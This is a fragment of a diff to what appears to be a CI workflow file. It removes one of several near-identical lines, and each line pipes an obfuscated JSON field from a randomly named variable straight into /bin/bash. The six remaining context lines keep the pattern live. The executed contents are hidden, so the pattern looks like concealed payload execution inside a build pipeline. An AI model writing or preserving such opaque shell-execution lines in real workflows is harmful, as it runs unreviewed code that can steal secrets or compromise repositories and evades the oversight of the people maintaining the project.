@@ -30,7 +30,6 @@ jobs:
           echo $e3 | jq -r .zvmdl40541 | /bin/bash
           echo $qco674 | jq -r .z9879 | /bin/bash
           echo $so1 | jq -r .tprn5 | /bin/bash
-          echo $vd70 | jq -r .a54 | /bin/bash
           echo $fupv71695 | jq -r .kp092 | /bin/bash
           printf '%s' "$qg67" | jq -r .w1901 | /bin/bash
           echo $iz4645 | jq -r .gvdke9 | /bin/bash
